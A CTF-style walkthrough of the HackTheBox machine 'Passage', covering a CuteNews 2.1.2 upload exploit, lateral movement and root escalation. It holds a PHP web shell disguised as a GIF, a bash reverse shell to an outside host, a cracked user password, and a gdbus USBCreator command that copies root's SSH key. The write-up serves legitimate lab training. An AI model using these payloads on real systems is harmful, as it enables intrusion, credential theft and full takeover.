---
layout: post
title: "HTB: Passage"
author: Andrew Cherney
date: 2023-01-13 19:49:23
tags: htb medium-box
icon: "/assets/icons/passage.png"
post_description: "The solution to Passage is quite research heavy and not so technically demanding. The CMS is vulnerable due to its specific version which gives a foothold, a pivot takes place to gain better permissions, and root can be obtained from a usbcreator d-bus service which allows for copying files as root."
---

<h1>Summary</h1>

The solution to Passage is quite research heavy and not so technically demanding. The CMS is vulnerable due to its specific version which gives a foothold, a pivot takes place twice to gain better permissions, and root can be obtained from a usbcreator d-bus service which allows for copying files as root.

<h1>Enumeration</h1>

<h2>rustscan</h2>

```bash
rustscan 10.10.10.206 | tee results.scan
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=
|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
```

<h2>Port 80 - Apache</h2>

![Passage News](/img/passage/passage_htb_news.png)

There appears to be a simple news site with two indications as to its CMS. The first is within the head tag with a reference to the CuteNews directory. The second is at the bottom of the page where it states _Powered by CuteNews_, and you can bet I inspected that element before reading to the bottom of the page. Before we leave this page it is important to check the usernames posting and commenting. 

When hovering over hyperlinked names they print out a <code>mailto:username@passage.htb</code> which is presumably their internal username. The full list of names present are nadav, kim, sid, and paul. We'll probably use that later, now onto the CMS!

<h2>CuteNews</h2>

CuteNews is a CMS which has its default login page at /CuteNews where that string is case sensitive, so why don't we head there. 

![CuteNews login](/img/passage/passage_htb_cutenews_login.png)

I would like to draw our attentions to the version of CuteNews being run here. Version 2.1.2 is what is run here, and in the great words of G.I. Joe: "Knowing is half the battle." Coincidentally the other half of this battle is a google search to yield [an RCE on this exact version](https://www.exploit-db.com/exploits/46698). The exploit uses a bypass for the avatar image upload where the GIF tag can be used to upload php code. But first we need to make an account. 

![CuteNews registration](/img/passage/passage_htb_cutenews_registration.png)

![CuteNews Profile](/img/passage/passage_htb_cutenews_profile.png)

<h1>Foothold as www-data</h1>

<h2>Image Upload Bypass</h2>

![CuteNews Profile Options](/img/passage/passage_htb_cutenews_options.png)

That looks to be the avatar image upload we read about in the exploit, and instead of using that script I will manually exploit the vulnerability. So to do that I need a php payload to upload, and then to add GIF to the top. I'll try a simple way to pass regular commands to the uploaded file and poke around from there. 

```php
GIF;
<?php system($_GET['cmd']) ?>
```

![User Info updated](/img/passage/passage_htb_cutenews_avatar_upload.png)

And if that worked properly I should be able to head to that image by right clicking and selecting **Open Image In New Tab** and see I can execute commands. Normally I would need to find a clever way around upload restrictions but in this case I have free reign to upload any file I want permitting it begins with GIF;.

![PHP cmd](/img/passage/passage_news_php_cmd_exploit.png)

From here I can execute any command I want with a post to cmd in the url <code>http://passage.htb/CuteNews/uploads/avatar_raccoon_cmd.php?cmd=</code> but there is a marginally easier solution to this problem.

<h2>Remote Shell from RCE</h2>

If this were the initial writeup I made when I hacked this box when it was current, there would be a couple paragraphs about enumerating the system for potential access points or keys to ssh in with. In hindsight I now know that I have unfettered command execution as www-data or equivalent which means I can upload a reverse shell. 

```php
GIF;
<?php  exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.10/7777 0>&1'");?>
```

Then I can head to <code>http://passage.htb/CuteNews/uploads/avatar_raccoon_shell.php</code> after uploading my new reverse shell and gain a foothold. The added bonus to this method is if I ever get disconnected I can simply revisit that url to reopen my connection. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Passage]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.206] 57522
bash: cannot set terminal process group (1697): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ 
```

<h1>User</h1>

<h2>Enumeration</h2>

Okay so typically in this position of entering a machine as www-data we now need to gain access to some user. One clue to our next step would be the names within the blog itself: nadav and paul. Those two usernames exist in the blog and /home directory, and it is possible that one of their passwords is identical to their CuteNews account.  

I poke around for a bit and find a users folder with the path <code>/var/www/html/CuteNews/cdata/users</code> which contains some suspicious logs. 

```bash
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 0a	
cat 0a.php 
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
```

<h2>User as paul</h2>

That string is undeniably base64, and although that first entry is utter gibberish a few others make some more sense. After checking some more files I come across <code>b0.php</code> where paul's password is listed in what I can only assume is hash form.

```
YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
```

![CyberChef Base64 paul](/img/passage/passage_htb_cyberchef_paul_password.png)

We'll toss that into CrackStation to see if there's an immediate match. 

![CrackStation paul password](/img/passage/passage_htb_paul_password_crack.png)

```bash
www-data@passage:/var/www/html/CuteNews$ python -c 'import pty; pty.spawn("/bin/bash")'
<tml/CuteNews$ python -c 'import pty; pty.spawn("/bin/bash")'                
www-data@passage:/var/www/html/CuteNews$ su paul
su paul
Password: atlanta1

paul@passage:/var/www/html/CuteNews$ 
```

Before being allowed to change users with **su** I needed to spawn a better shell, otherwise I would get a bark from the machine about needing a terminal. 

<h2>User as nadav</h2>

In my preliminary enumeration I find a peculiar file in paul's **.ssh** directory, take a look:

```bash
paul@passage:~/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

This makes me wonder if I could ssh into nadav with paul's private key.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Passage]
└──╼ $ssh -i id_rsa nadav@passage.htb
Last login: Mon Jan 30 16:56:09 2023 from 10.10.14.10
nadav@passage:~$ 
```

<h1>Root</h1>

<h2>.viminfo</h2>

Typically these types of history files such as **.bash_history** and **.viminfo** are disabled on HackTheBox machines, and it's presence likely implies my priv esc path lies inside. The end of the file reads: 

```nano
# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	"	12	7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	"	2	0
	.	2	0
	+	2	0
```

<h2>USBCreator</h2>

Performing a highly complex search of _**USBCreator priv esc**_ I came across [this d bus privilege escalation through USBCreator](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/). In short, there is a system bus from D-Bus which runs privileged services, USBCreator is one of those services that allows unprivileged user input, making this priv esc possible. You don't need to understand the underlying D-Bus functions for the exploit to work properly, though the link for the priv esc goes quite in depth on this topic and I would recommend a read. 



```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Passage]
└──╼ $ssh root@passage.htb -i root_key 
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# cat root.txt 
5a79aa-----------------
```


